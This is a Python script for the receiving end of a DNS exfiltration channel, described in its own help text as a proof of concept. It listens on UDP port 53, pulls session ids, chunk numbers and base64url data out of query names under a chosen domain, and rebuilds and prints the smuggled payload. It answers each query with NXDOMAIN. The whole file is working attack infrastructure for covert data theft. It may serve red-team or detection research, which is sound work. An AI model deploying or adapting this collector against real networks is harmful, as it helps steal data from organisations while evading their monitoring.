import argparse
import base64
import socket

HEADER_LENGTH = 12


def parse_dns_query_name(data):
    if len(data) < HEADER_LENGTH:
        raise ValueError("DNS packet is shorter than the header")

    labels = []
    index = HEADER_LENGTH

    while True:
        if index >= len(data):
            raise ValueError("DNS query ended before the name terminator")

        label_length = data[index]
        index += 1

        if label_length == 0:
            break

        if label_length & 0xC0:
            raise ValueError("Compressed query names are not supported")

        label_end = index + label_length
        if label_end > len(data):
            raise ValueError("DNS label exceeds packet length")

        labels.append(data[index:label_end].decode("ascii"))
        index = label_end

    return labels


def decode_base64url(value):
    padding = "=" * (-len(value) % 4)
    return base64.urlsafe_b64decode(value + padding).decode()


def construct_nxdomain_response(data):
    transaction_id = data[:2]
    flags = b"\x81\x83"
    counts = b"\x00\x01\x00\x00\x00\x00\x00\x00"
    return transaction_id + flags + counts + data[HEADER_LENGTH:]


def build_sessions():
    return {}


def handle_query(labels, sessions, domain):
    domain_labels = domain.strip(".").split(".")
    if len(labels) < len(domain_labels) + 4:
        raise ValueError("Query does not include exfiltration metadata")

    if labels[-len(domain_labels) :] != domain_labels:
        raise ValueError(f"Query is outside configured domain: {'.'.join(labels)}")

    session_id, chunk_index_raw, chunk_total_raw, chunk = labels[:4]
    chunk_index = int(chunk_index_raw)
    chunk_total = int(chunk_total_raw)

    if chunk_index < 0 or chunk_total <= 0 or chunk_index >= chunk_total:
        raise ValueError("Chunk index metadata is invalid")

    session = sessions.setdefault(session_id, {"total": chunk_total, "chunks": {}})
    if session["total"] != chunk_total:
        raise ValueError("Chunk total changed during session")

    session["chunks"][chunk_index] = chunk
    received = len(session["chunks"])
    print(f"Session {session_id}: received chunk {chunk_index + 1}/{chunk_total}")

    if received != chunk_total:
        return

    encoded_payload = "".join(
        session["chunks"][index] for index in range(session["total"])
    )
    payload = decode_base64url(encoded_payload)
    print(f"Recovered payload from session {session_id}: {payload}")
    del sessions[session_id]


def parse_args():
    parser = argparse.ArgumentParser(
        description="Receive DNS exfiltration proof-of-concept queries."
    )
    parser.add_argument(
        "-b",
        "--bind",
        default="127.0.0.1",
        help="Address to bind. Defaults to 127.0.0.1.",
    )
    parser.add_argument(
        "-p",
        "--port",
        type=int,
        default=53,
        help="UDP port to bind. Defaults to 53.",
    )
    parser.add_argument(
        "-d",
        "--domain",
        default="testing.com",
        help="Authoritative domain suffix to accept. Defaults to testing.com.",
    )
    return parser.parse_args()


def main():
    args = parse_args()
    sessions = build_sessions()

    server_socket = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    server_socket.bind((args.bind, args.port))
    print(f"Listening on {args.bind}:{args.port} for *.{args.domain}")

    while True:
        data, client_address = server_socket.recvfrom(1024)
        print(f"Connection from {client_address}")

        try:
            labels = parse_dns_query_name(data)
            handle_query(labels, sessions, args.domain)
        except (UnicodeDecodeError, ValueError) as error:
            print(f"Ignoring malformed query: {error}")
        finally:
            response = construct_nxdomain_response(data)
            server_socket.sendto(response, client_address)


if __name__ == "__main__":
    main()
